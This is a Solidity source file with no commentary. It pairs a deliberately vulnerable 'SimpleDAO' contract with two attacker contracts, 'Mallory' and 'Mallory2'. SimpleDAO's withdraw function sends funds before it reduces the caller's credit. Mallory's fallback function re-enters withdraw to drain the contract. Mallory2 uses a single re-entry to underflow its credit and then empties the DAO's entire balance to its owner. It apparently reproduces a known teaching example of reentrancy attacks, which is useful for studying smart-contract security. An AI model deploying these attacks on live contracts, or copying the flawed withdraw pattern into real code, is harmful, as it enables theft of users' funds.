pragma solidity ^0.4.19;

contract SimpleDAO {
  mapping (address => uint) public credit;

  function donate(address to) payable public {
    credit[to] += msg.value;
  }

  function withdraw(uint amount) public returns (bool) {
    if (credit[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
      return res;
    }
    return false;
  }

  function queryCredit(address to) public view returns (uint){
    return credit[to];
  }
}


contract Mallory {
  SimpleDAO public dao;
  address owner;

  function Mallory(SimpleDAO addr) public {
    owner = msg.sender;
    dao = addr;
  }

  function getJackpot() public returns (bool) {
    bool res = owner.send(this.balance);
    return res;
  }

  function() payable public {
    dao.withdraw(dao.queryCredit(this));
  }
}

contract Mallory2 {
  SimpleDAO public dao;
  address owner;
  bool public performAttack = true;

  function Mallory2(SimpleDAO addr) public {
    owner = msg.sender;
    dao = addr;
  }

  function attack() payable public {
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function getJackpot() public returns (bool) {
    dao.withdraw(dao.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
    return res;
  }

  function() payable public {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}
